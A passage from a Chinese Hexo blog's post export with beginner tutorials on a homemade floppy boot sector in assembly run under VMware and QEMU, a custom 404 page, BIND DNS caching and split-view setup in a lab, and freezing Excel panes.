<h2 id="驱动软盘"><a href="#驱动软盘" class="headerlink" title="驱动软盘"></a>驱动软盘</h2><h3 id="vmware虚拟机驱动软盘"><a href="#vmware虚拟机驱动软盘" class="headerlink" title="vmware虚拟机驱动软盘"></a>vmware虚拟机驱动软盘</h3><p>vmware新建虚拟机，操作系统选择【其他】，版本【其他】。否则无法用我们做好的软盘镜像驱动操作系统&lt;亲身经验<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctdmmcqs5j30fu0fbt92.jpg" alt="image.png"><br>点击添加软盘驱动器，将镜像文件添加到软盘：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctdjhwmsdj31f60u0q73.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctdkissesj30nw0q30tr.jpg" alt="image.png"><br>此时，开启虚拟机，就可以看到软盘驱动成功，显示了<code>hello world</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctd5xk6odj31f60u0jsu.jpg" alt="image.png"></p>
<h3 id="qemu驱动软盘"><a href="#qemu驱动软盘" class="headerlink" title="qemu驱动软盘"></a>qemu驱动软盘</h3><p>到<a href="https://qemu.weilnetz.de/w64/2020/">官网下载</a>qemu。<br>使用方法：把软盘文件拷贝到qemu的安装目录，在这个目录下用powershell进入命令行进行操作。（因为我们这个软盘是做的32位操作系统，所以选择<code>qemu-system-i386.exe</code>）<br>命令行语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\qemu-system-i386.exe -hdd .\danaOS.img</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctdydvjc7j30xz0oowgj.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>显然，用QEMU驱动软盘镜像比vmware要省时。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blackblog.tech/2018/07/18/CreateOSDay1/">二进制内容参考的这位兄弟的博客</a><br><a href="https://blog.csdn.net/Timbo0/article/details/53892716">用vmware驱动软盘参照的这篇文章</a></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>30天自制操作系统</tag>
        <tag>vmware</tag>
        <tag>软盘驱动镜像</tag>
        <tag>hello world</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客怎样自定义404页面</title>
    <url>//posts/ZH-CN/how-to-customize-404-page-in-hexo-blog.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看了下我的博客“长ping”关键词竟然排到了谷歌搜索结果的第一位！但是昨天更新了所有文章的url地址，谷歌并没有及时抓取最新内容。所以导致这个排名第一的网页，用户打开之后看不到内容，这样的用户体验是绝对无法忍受的！于是，就有了自定义404页面的需求。本文记录了将404页面重定向到网站首页，并引导客户在网站内进行搜索的具体操作步骤。<br><escape> <span id="more"></span></escape></p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image.png" alt="image.png"></p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>以下操作步骤适用于任何主题，不管你是hexo还是其他主题，操作步骤都一样。</p>
<ol>
<li><p>在博客主题的source文件夹下面创建<code>404.html</code>，这个html文件就是用来自定义404页面的。<br>比如我是next主题的博客，就是在<code>\themes\next\source</code>路径下创建<code>404.html</code><br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image8f94f3a6ef348c9f.png" alt="image8f94f3a6ef348c9f.png"></p>
</li>
<li><p>接下来编辑这个html文件，写入自定义404页面的内容，我用了<a href="https://www.qq.com/404/">腾讯的公益404页面</a>，以下代码供参考：</p>
<blockquote>
<p>！！注意：请将以下代码中的<code>https://dana5haw.com</code>替换为你的网站首页，<code>返回主页（您可以进入首页继续搜索）</code>替换为引导用户回到网站首页的引导语。</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>js文件的地址可能会有更新，请以腾讯官方代码为准<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image845ad54beb3a14e4.png" alt="image845ad54beb3a14e4.png"></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;https://dana5haw.com&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回主页（您可以进入首页继续搜索）&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>部署上传，更新网站。输入命令<code>hexo g -d</code>即可。</li>
<li>测试404页面。在域名下输入一个不存在的地址，看看404页面是否更新成功。比如我的域名是<code>dana5haw.com</code>，那么我可以输入<code>https://dana5haw.com/111</code>这个不存在的地址进行测试。<br>看看自定义之后的404页面是什么样子呢？<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image61eb468b2a976a0f.png" alt="image61eb468b2a976a0f.png"></li>
</ol>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>你还可以把404页面写得很炫酷，掌握这个操作方法就可以了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/21650209">https://www.zhihu.com/question/21650209</a></p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://dana5haw.com/posts/en/how-to-customize-404-page-in-hexo-blog.html">https://dana5haw.com/posts/en/how-to-customize-404-page-in-hexo-blog.html</a></p>
]]></content>
      <categories>
        <category>hexo blog</category>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>404 page</tag>
        <tag>hexo blog</tag>
        <tag>next theme</tag>
        <tag>404页面</tag>
        <tag>hexo博客</tag>
        <tag>next主题</tag>
      </tags>
  </entry>
  <entry>
    <title>30天自制操作系统-工具准备</title>
    <url>//posts/ZH-CN/Os_Tool.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是学习操作系统知识。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a>二进制编辑器</h2><p><a href="https://www.vcraft.jp/soft/bz.html">下载链接</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gct9kv8butj31f60u07ah.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>30天自制操作系统</tag>
        <tag>二进制编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title>30天自制操作系统-用汇编语言制作软盘镜像</title>
    <url>//posts/ZH-CN/Os_Softdisk_Basic.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>除了直接使用二进制编辑器写机器码之外，我们可以用汇编语言来制作软盘镜像。写出的汇编语言，以<code>.nas</code>为后缀，我们用nask这个汇编工具将汇编语言转为机器码（即软盘镜像<code>*.img</code>）。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="汇编程序"><a href="#汇编程序" class="headerlink" title="汇编程序"></a>汇编程序</h2><p>汇编程序和直接编写机器码是差不多的，不过可以用<code>RESB</code>表示连续多个字节是<code>0x00</code>（比如<code>RESB 10</code>就表示连续10个字节都是<code>0x00</code>）。</p>
<blockquote>
<p>RESB：reserve byte 意思是保留字节，相当于用<code>0x00</code>来占位<br>DB：define byte 表示写入字节</p>
</blockquote>
<blockquote>
<p>一张软盘的大小的1440KB，KB就是kilobyte，1KB等于1024byte（字节）。1byte（字节）等于8bit（比特），能记录8个0和1的信息。<br>1440KB=1440*1024byte=1474560byte<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctgmz8mhqj30w40h9agp.jpg" alt="image.png"></p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctgqz0qfij31bk0rzn6q.jpg" alt="image.png"><br>注意，这个代码必须是每行的前面都有一个tab键。<del>我这里写的不知道为什么渲染出来格式没对🙃</del>，加一行注释就可以显示正确格式了😜</p>
<details><summary>代码：helloos.nas</summary>
<p>

<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 代码</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xeb</span>, <span class="number">0x4e</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x4c</span>, <span class="number">0x4f</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x49</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x02</span>, <span class="number">0xe0</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x0b</span>, <span class="number">0xf0</span>, <span class="number">0x09</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x40</span>, <span class="number">0x0b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0xff</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x4c</span>, <span class="number">0x4f</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x2d</span>, <span class="number">0x4f</span>, <span class="number">0x53</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x46</span>, <span class="number">0x41</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x54</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">RESB</span>	<span class="number">16</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8e</span>, <span class="number">0xd0</span>, <span class="number">0xbc</span>, <span class="number">0x00</span>, <span class="number">0x7c</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x8e</span>, <span class="number">0xd8</span>, <span class="number">0x8e</span>, <span class="number">0xc0</span>, <span class="number">0xbe</span>, <span class="number">0x74</span>, <span class="number">0x7c</span>, <span class="number">0x8a</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x04</span>, <span class="number">0x83</span>, <span class="number">0xc6</span>, <span class="number">0x01</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0x74</span>, <span class="number">0x09</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xb4</span>, <span class="number">0x0e</span>, <span class="number">0xbb</span>, <span class="number">0x0f</span>, <span class="number">0x00</span>, <span class="number">0xcd</span>, <span class="number">0x10</span>, <span class="number">0xeb</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xee</span>, <span class="number">0xf4</span>, <span class="number">0xeb</span>, <span class="number">0xfd</span>, <span class="number">0x0a</span>, <span class="number">0x0a</span>, <span class="number">0x68</span>, <span class="number">0x65</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x6f</span>, <span class="number">0x72</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">RESB</span>	<span class="number">368</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0xaa</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xf0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">RESB</span>	<span class="number">4600</span></span><br><span class="line">	<span class="built_in">DB</span>	<span class="number">0xf0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	<span class="built_in">RESB</span>	<span class="number">1469432</span></span><br></pre></td></tr></table></figure>

</p>
</details>

<h2 id="汇编工具nask"><a href="#汇编工具nask" class="headerlink" title="汇编工具nask"></a>汇编工具nask</h2><p>直接从教程里面拷贝过去的一个exe程序。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctffll01sj30nk00w742.jpg" alt="image.png"><br>使用方法：将汇编程序拷贝到<code>nask.exe</code>所在目录，用powershell开启命令行，输入<code>.\nask.exe .\helloos.nas .\helloos.img</code>，生成<code>helloos.img</code>这个软盘镜像文件。</p>
<h2 id="用QEMU驱动软盘镜像"><a href="#用QEMU驱动软盘镜像" class="headerlink" title="用QEMU驱动软盘镜像"></a>用QEMU驱动软盘镜像</h2><p>在QEMU中进行验证，用汇编语言制作的img镜像也可以正常驱动。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctfsl7781j30yi0fbjsd.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>30天自制操作系统</tag>
        <tag>汇编语言</tag>
        <tag>软盘镜像</tag>
        <tag>nask</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS缓存服务搭建</title>
    <url>//posts/ZH-CN/DNS-cache-server.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DNS缓存服务是为了加快用户访问网站的速度。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="DNS缓存服务器搭建"><a href="#DNS缓存服务器搭建" class="headerlink" title="DNS缓存服务器搭建"></a>DNS缓存服务器搭建</h2><p>缓存服务器(双网卡)：</p>
<ul>
<li>网卡一：桥接模式</li>
<li>网卡二：仅主机模式，192.168.0.106<br>客户端（仅主机模式）：192.168.0.102</li>
</ul>
<ol>
<li>缓存服务器设置</li>
</ol>
<ul>
<li>添加双网卡，一个连外网、一个连内网<br>连外网的网卡：设置为桥接模式<br>连内网的网卡：设置为仅主机模式，IP地址设置为192.168.0.106</li>
<li>安装bind-chroot<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install bind-chroot</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件<code>/etc/named.conf</code><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image78b27f29415d80dc.png" alt="image78b27f29415d80dc.png"></li>
<li>编辑配置文件<code>/etc/sysctl.conf</code>，写入下面这句，开启ipv4转发功能<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
输入命令<code>sysctl -p</code>立即生效</li>
<li>清除防火墙规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
<li>开启DNS服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start named</span><br><span class="line">systemctl enable named</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>客户端配置</li>
</ol>
<ul>
<li>设置网卡信息，网关和DNS服务器设置为缓存服务器的IP地址192.168.0.106<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nm-connection-editor #进入图形化界面配置IP信息</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image5e5effb880c24fdc.png" alt="image5e5effb880c24fdc.png"></li>
<li>验证DNS缓存服务的效果<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 192.168.0.106 #保证能够ping通DNS缓存服务器的IP地址</span><br><span class="line">nslookup www.baidu.com #目前无法获取到缓存DNS信息，应该是DNS服务器（114.114.114.114）有限制</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image09493880cf1839e6.png" alt="image09493880cf1839e6.png"></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>DNS缓存服务</tag>
      </tags>
  </entry>
  <entry>
    <title>30天自制操作系统-汇编程序制作软盘进阶</title>
    <url>//posts/ZH-CN/Os_Softdisk_Pro.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们刚刚用的汇编程序，不过是把0x00的书写简化了，程序内容依然是看不懂的十六进制字符串。现在我们把汇编程序写得更易懂一些。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="汇编程序"><a href="#汇编程序" class="headerlink" title="汇编程序"></a>汇编程序</h2><p>这个程序代码最好是用编辑器写（比如我用的是VScode），如果用记事本写，会因为tab键的问题而导致无法用nask转换为img镜像。&lt;亲身经验</p>
<details><summary>程序代码：helloostest.nas</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; hello-os</span><br><span class="line">; TAB=4</span><br><span class="line"></span><br><span class="line">; 以下这段是标准FAT12格式软盘专用的代码</span><br><span class="line"></span><br><span class="line">	DB	0xeb, 0x4e, 0x90</span><br><span class="line">	DB	&quot;HELLOIPL&quot;		; 启动区的名称可以是任意字符串（8字节）</span><br><span class="line">	DW	512				; 每个扇区（sector）的大小（必须是512字节）</span><br><span class="line">	DB	1				; 簇（cluster）的大小（必须是1个扇区）</span><br><span class="line">	DW	1				; FAT的起始位置（一般从第一个扇区开始）</span><br><span class="line">	DB	2				; FAT的个数（必须是2）</span><br><span class="line">	DW	224				; 根目录的大小（一般设成224项）</span><br><span class="line">	DW	2880			; 该磁盘的大小（必须是2880扇区）</span><br><span class="line">	DB	0xf0			; 磁盘的种类（必须是0xf0）</span><br><span class="line">	DW	9				; FAT的长度（必须是9扇区）</span><br><span class="line">	DW	18				; 1个磁道（track）有几个扇区（必须是18）</span><br><span class="line">	DW	2				; 磁头数（必须是2）</span><br><span class="line">	DD	0				; 不适用分区，必须是0</span><br><span class="line">	DD	2880			; 重写一次磁盘大小</span><br><span class="line">	DB	0,0,0x29		; 意义不明，固定</span><br><span class="line">	DD	0xffffffff		; 可能是卷标号码</span><br><span class="line">	DB	&quot;HELLO-OS   &quot;	; 磁盘的名称（11字节）</span><br><span class="line">	DB	&quot;FAT12   &quot;		; 磁盘格式的名称（8字节）</span><br><span class="line">	RESB	18				; 先空出18字节</span><br><span class="line"></span><br><span class="line">; 程序主体</span><br><span class="line"></span><br><span class="line">	DB	0xb8, 0x00, 0x00, 0x8e, 0xd0, 0xbc, 0x00, 0x7c</span><br><span class="line">	DB	0x8e, 0xd8, 0x8e, 0xc0, 0xbe, 0x74, 0x7c, 0x8a</span><br><span class="line">	DB	0x04, 0x83, 0xc6, 0x01, 0x3c, 0x00, 0x74, 0x09</span><br><span class="line">	DB	0xb4, 0x0e, 0xbb, 0x0f, 0x00, 0xcd, 0x10, 0xeb</span><br><span class="line">	DB	0xee, 0xf4, 0xeb, 0xfd</span><br><span class="line"></span><br><span class="line">; 信息显示部分</span><br><span class="line"></span><br><span class="line">	DB	0x0a, 0x0a		; 2个换行</span><br><span class="line">	DB	&quot;hello, world&quot;  ; 可以自定义操作系统显示界面</span><br><span class="line">	DB	0x0a			; 换行</span><br><span class="line">	DB	0</span><br><span class="line"></span><br><span class="line">	RESB	0x1fe-$			; 填写0x00，直到0x001fe。这里的$指的是当前这行的字节数</span><br><span class="line"></span><br><span class="line">	DB	0x55, 0xaa</span><br><span class="line"></span><br><span class="line">; 以下是启动区以外部分的输出</span><br><span class="line"></span><br><span class="line">	DB	0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">	RESB	4600</span><br><span class="line">	DB	0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">	RESB	1469432</span><br></pre></td></tr></table></figure>

</p>
</details>

<blockquote>
<p>扇区<br>512byte（字节）为一个扇区，软盘有1440KB（即1474560byte），1474560/512=2880。也就是说这个软盘一共有2880个扇区。第一个扇区是启动区（boot sector），启动区的最后两个字节是<code>0x55</code>和<code>0xaa</code>。</p>
</blockquote>
<blockquote>
<p>IPL<br>IPL（initial program loader），启动程序加载器。操作系统一般将本身的程序放到启动区。</p>
</blockquote>
<h2 id="制作软盘镜像"><a href="#制作软盘镜像" class="headerlink" title="制作软盘镜像"></a>制作软盘镜像</h2><p>把程序文件拷贝到nask程序所在目录，打开powershell执行命令：<code>.\nask.exe .\helloostest.nas .\hello77.img</code></p>
<h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>把生成的img镜像放到qemu程序所在目录，打开powershell执行命令：<code>.\qemu-system-i386.exe -hdd .\hello77.img</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctiu5ee9yj30xt0hwacd.jpg" alt="image.png"><br>更改程序里面这行代码，可以修改操作系统界面的显示内容。</p>
<div class="note info">
            <p><code>DB    &quot;hello, world&quot;  ; 可以自定义操作系统显示界面</code></p>
          </div>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gctj42ka5fj30xz0kz400.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写程序还是使用编辑器比较好，用记事本太容易引起格式错误了，多么惨痛的教训……</p>
]]></content>
      <categories>
        <category>30天自制操作系统</category>
      </categories>
      <tags>
        <tag>30天自制操作系统</tag>
        <tag>汇编程序制作软盘</tag>
      </tags>
  </entry>
  <entry>
    <title>Excel冻结前几行窗格</title>
    <url>//posts/ZH-CN/Excel-freeze-rows.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>制作了一个多行的excel表头，现在我需要冻结住表头，方便在滑动鼠标的时候看到表头信息。<br><escape> <span id="more"></span></escape></p>
<h2 id="excel冻结前几行窗格的方法"><a href="#excel冻结前几行窗格的方法" class="headerlink" title="excel冻结前几行窗格的方法"></a>excel冻结前几行窗格的方法</h2><ol>
<li>选中首行，冻结首行<br><a href="https://v2ray.dana5haw.com:8008/image/1R6y"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image.png" alt="image.png"></a></li>
<li>点击拆分，在首行出现一条细实线。此时拉动这条细实线，想冻结到哪一行，就把细实线拉动到哪一行<br><a href="https://v2ray.dana5haw.com:8008/image/19sA"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image12ada8cd28b48b84.png" alt="image12ada8cd28b48b84.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/1DM9"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/imagee66f0eca7f4ca501.png" alt="imagee66f0eca7f4ca501.png"></a></li>
<li>再次点击冻结窗格，就可以冻结自己用细实线拆分出来的前几行窗格<br><a href="https://v2ray.dana5haw.com:8008/image/1tlO"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image8e07dc51b2de48a4.png" alt="image8e07dc51b2de48a4.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/ZVX6"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/imagedce978307d77bead.png" alt="imagedce978307d77bead.png"></a></li>
<li>动图展示<br><a href="https://v2ray.dana5haw.com:8008/image/ZlJh"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/test3.gif" alt="冻结前两行窗格.gif"></a><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>参考这篇<a href="http://www.officexr.com/c/23433.html">教程</a></li>
</ol>
]]></content>
      <categories>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel快捷键</tag>
        <tag>冻结窗格</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS分离解析服务搭建</title>
    <url>//posts/ZH-CN/DNS-seperate-explanation.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DNS分离解析实现的效果就是，同一个域名，在不同地区解析出的IP地址不同。很常用，目的是加快用户访问网站的速度，比如：cdn加速。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="DNS分离解析服务搭建"><a href="#DNS分离解析服务搭建" class="headerlink" title="DNS分离解析服务搭建"></a>DNS分离解析服务搭建</h2><p>DNS服务器：</p>
<ul>
<li>北京网络：122.71.115.1</li>
<li>美国网络：106.185.25.1<br>客户端：</li>
<li>北京用户：122.71.115.10</li>
<li>美国用户：106.185.25.10</li>
</ul>
<ol>
<li>安装bind-chroot<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install bind-chroot</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件<code>/etc/named.conf</code>，改为any，并删除根域信息。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image3b61f8066837cf2b.png" alt="image3b61f8066837cf2b.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image5efa1af0d50dd0be.png" alt="image5efa1af0d50dd0be.png"></li>
<li>编辑区域配置文件<code>/etc/named.rfc1912.zones</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl &quot;china&quot; &#123; 122.71.115.0/24; &#125;;</span><br><span class="line">acl &quot;america&quot; &#123; 106.185.25.0/24; &#125;;</span><br><span class="line">view &quot;china&quot; &#123;</span><br><span class="line">match-clients &#123; &quot;china&quot;; &#125;;</span><br><span class="line">zone &quot;linuxprobe.com&quot; &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;linuxprobe.com.china&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">view &quot;america&quot; &#123;</span><br><span class="line">match-clients &#123; &quot;america&quot;; &#125;;</span><br><span class="line">zone &quot;linuxprobe.com&quot; &#123;</span><br><span class="line">type master;</span><br><span class="line">file &quot;linuxprobe.com.america&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>拷贝正向解析模板<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -a /var/named/named.local /var/named/linuxprobe.com.china #北京用户正向解析文件</span><br><span class="line">cp -a /var/named/named.local /var/named/linuxprobe.com.america #美国用户正向解析文件</span><br></pre></td></tr></table></figure></li>
<li>编辑正向解析文件</li>
</ol>
<ul>
<li>编辑北京用户正向解析文件<code>/var/named/linuxprobe.com.china</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$TTL 1D</span><br><span class="line">@       IN SOA  linuxprobe.com. root.linuxprobe.com. (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      ns.linuxprobe.com.</span><br><span class="line">ns      IN A    122.71.115.1</span><br><span class="line">www     IN A    122.71.115.1</span><br></pre></td></tr></table></figure></li>
<li>编辑美国用户正向解析文件<code>/var/named/linuxprobe.com.america</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$TTL 1D</span><br><span class="line">@       IN SOA  linuxprobe.com. root.linuxprobe.com. (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      ns.linuxprobe.com.</span><br><span class="line">ns      IN A    106.185.25.1</span><br><span class="line">www     IN A    106.185.25.1</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li>清空防火墙规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
